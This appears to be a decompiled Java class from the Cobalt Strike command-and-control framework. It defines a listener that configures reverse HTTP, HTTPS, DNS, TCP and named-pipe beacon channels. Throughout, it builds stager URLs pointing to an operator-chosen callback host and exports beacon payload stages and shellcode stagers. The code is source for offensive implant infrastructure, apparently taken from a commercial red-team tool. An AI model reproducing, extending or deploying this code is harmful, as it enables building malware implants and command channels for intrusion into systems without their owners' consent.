package common;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import beacon.BeaconPayload;
import c2profile.Profile;
import dialog.DialogUtils;
import java.util.HashMap;
import java.util.Map;
import stagers.Stagers;

public class ScListener {
   protected Map options;
   protected Profile c2profile;
   protected byte[] pubkey;
   protected ListenerConfig config;

   public ScListener(AggressorClient var1, Map var2) {
      this(var1.getData(), var2);
   }

   public ScListener(DataManager var1, Map var2) {
      this(DataUtils.getProfile(var1), DataUtils.getPublicKey(var1), var2);
   }

   public ScListener(Profile var1, byte[] var2, Map var3) {
      this.options = var3;
      this.c2profile = var1.getVariantProfile(this.getVariantName());
      this.pubkey = var2;
      this.config = new ListenerConfig(this.c2profile, this);
   }

   public byte[] getPublicKey() {
      return this.pubkey;
   }

   public String getVariantName() {
      return DialogUtils.string(this.options, "profile");
   }

   public String getHostHeader() {
      return DialogUtils.string(this.options, "althost");
   }

   public Profile getProfile() {
      return this.c2profile;
   }

   public String getName() {
      return DialogUtils.string(this.options, "name");
   }

   public String getPayload() {
      return DialogUtils.string(this.options, "payload");
   }

   public ListenerConfig getConfig() {
      return this.config;
   }

   public int getBindPort() {
      return !DialogUtils.isNumber(this.options, "bindto") ? this.getPort() : DialogUtils.number(this.options, "bindto");
   }

   public boolean isLocalHostOnly() {
      return DialogUtils.bool(this.options, "localonly");
   }

   public int getPort() {
      return DialogUtils.number(this.options, "port");
   }

   public String getStagerHost() {
      return DialogUtils.string(this.options, "host");
   }

   public String getCallbackHosts() {
      return DialogUtils.string(this.options, "beacons");
   }

   public String getCallbackHost() {
      String[] var1 = this.getCallbackHosts().split(",\\s*");
      return var1.length == 0 ? "" : var1[0];
   }

   public String getProxyString() {
      return DialogUtils.string(this.options, "proxy");
   }

   public void setProxyString(String var1) {
      this.options.put("proxy", var1);
   }

   public String getPipeName() {
      return DialogUtils.string(this.options, "port");
   }

   public String getPipeName(String var1) {
      return "\\\\" + var1 + "\\pipe\\" + this.getPipeName();
   }

   public String getStagerURI(String var1) {
      String var2;
      if ("windows/beacon_http/reverse_http".equals(this.getPayload())) {
         var2 = "x86".equals(var1) ? this.getConfig().getURI() : this.getConfig().getURI_X64();
         return "http://" + this.getStagerHost() + ":" + this.getPort() + var2;
      } else if ("windows/beacon_https/reverse_https".equals(this.getPayload())) {
         var2 = "x86".equals(var1) ? this.getConfig().getURI() : this.getConfig().getURI_X64();
         return "https://" + this.getStagerHost() + ":" + this.getPort() + var2;
      } else if ("windows/foreign/reverse_http".equals(this.getPayload()) && "x86".equals(var1)) {
         var2 = CommonUtils.MSFURI();
         return "http://" + this.getStagerHost() + ":" + this.getPort() + var2;
      } else if ("windows/foreign/reverse_https".equals(this.getPayload()) && "x86".equals(var1)) {
         var2 = CommonUtils.MSFURI();
         return "https://" + this.getStagerHost() + ":" + this.getPort() + var2;
      } else {
         return "";
      }
   }

   public boolean hasStager() {
      return this.hasStager("x86");
   }

   public Map toMap() {
      return new HashMap(this.options);
   }

   public Map getC2Info(String var1) {
      HashMap var2 = new HashMap();
      var2.put("bid", var1);
      var2.put("domains", this.getCallbackHosts());
      var2.put("port", this.getPort() + "");
      Map var3 = CommonUtils.toMap("windows/beacon_dns/reverse_dns_txt", "dns", "windows/beacon_http/reverse_http", "http", "windows/beacon_https/reverse_https", "https");
      var2.put("proto", var3.get(this.getPayload()));
      return var2;
   }

   public boolean isForeign() {
      if ("windows/foreign/reverse_http".equals(this.getPayload())) {
         return true;
      } else {
         return "windows/foreign/reverse_https".equals(this.getPayload());
      }
   }

   public boolean hasStager(String var1) {
      if ("windows/foreign/reverse_http".equals(this.getPayload())) {
         return "x86".equals(var1);
      } else if ("windows/foreign/reverse_https".equals(this.getPayload())) {
         return "x86".equals(var1);
      } else if ("windows/beacon_bind_pipe".equals(this.getPayload())) {
         return false;
      } else if ("windows/beacon_bind_tcp".equals(this.getPayload())) {
         return false;
      } else if ("windows/beacon_reverse_tcp".equals(this.getPayload())) {
         return false;
      } else if ("windows/beacon_extc2".equals(this.getPayload())) {
         return false;
      } else if (!"windows/beacon_dns/reverse_dns_txt".equals(this.getPayload())) {
         return "windows/beacon_extc2".equals(this.getPayload()) ? false : this.c2profile.option(".host_stage");
      } else {
         return this.c2profile.option(".host_stage") && "x86".equals(var1);
      }
   }

   public byte[] getPayloadStager(String var1) {
      return Stagers.shellcode(this, this.getPayload(), var1);
   }

   public byte[] getPayloadStagerLocal(int var1, String var2) {
      return Stagers.shellcodeBindTcp(this, var1, var2);
   }

   public byte[] getPayloadStagerPipe(String var1, String var2) {
      return Stagers.shellcodeBindPipe(this, var1, var2);
   }

   protected String getFile(String var1, String var2) {
      return "x86".equals(var2) ? "resources/" + var1 + ".dll" : "resources/" + var1 + ".x64.dll";
   }

   public byte[] export(String var1) {
      return this.export(var1, 0);
   }

   public byte[] export(String var1, int var2) {
      if ("windows/foreign/reverse_http".equals(this.getPayload())) {
         return this.getPayloadStager(var1);
      } else if ("windows/foreign/reverse_https".equals(this.getPayload())) {
         return this.getPayloadStager(var1);
      } else if ("windows/beacon_http/reverse_http".equals(this.getPayload())) {
         return (new BeaconPayload(this, var2)).exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, false, var1);
      } else if ("windows/beacon_https/reverse_https".equals(this.getPayload())) {
         return (new BeaconPayload(this, var2)).exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, true, var1);
      } else if ("windows/beacon_dns/reverse_dns_txt".equals(this.getPayload())) {
         return (new BeaconPayload(this, var2)).exportBeaconStageDNS(this.getPort(), this.getCallbackHosts(), true, false, var1);
      } else if ("windows/beacon_bind_pipe".equals(this.getPayload())) {
         return (new BeaconPayload(this, var2)).exportSMBStage(var1);
      } else if ("windows/beacon_bind_tcp".equals(this.getPayload())) {
         return (new BeaconPayload(this, var2)).exportBindTCPStage(var1);
      } else if ("windows/beacon_reverse_tcp".equals(this.getPayload())) {
         return (new BeaconPayload(this, var2)).exportReverseTCPStage(var1);
      } else {
         AssertUtils.TestFail("Unknown payload '" + this.getPayload() + "'");
         return new byte[0];
      }
   }

   public String toString() {
      if ("windows/beacon_bind_tcp".equals(this.getPayload())) {
         return this.isLocalHostOnly() ? this.getPayload() + " (127.0.0.1:" + this.getPort() + ")" : this.getPayload() + " (0.0.0.0:" + this.getPort() + ")";
      } else if ("windows/beacon_bind_pipe".equals(this.getPayload())) {
         return this.getPayload() + " (\\\\.\\pipe\\" + this.getPipeName() + ")";
      } else if ("windows/beacon_reverse_tcp".equals(this.getPayload())) {
         return this.getPayload() + " (" + this.getStagerHost() + ":" + this.getPort() + ")";
      } else {
         return this.isForeign() ? this.getPayload() + " (" + this.getStagerHost() + ":" + this.getPort() + ")" : this.getPayload() + " (" + this.getCallbackHost() + ":" + this.getPort() + ")";
      }
   }
}
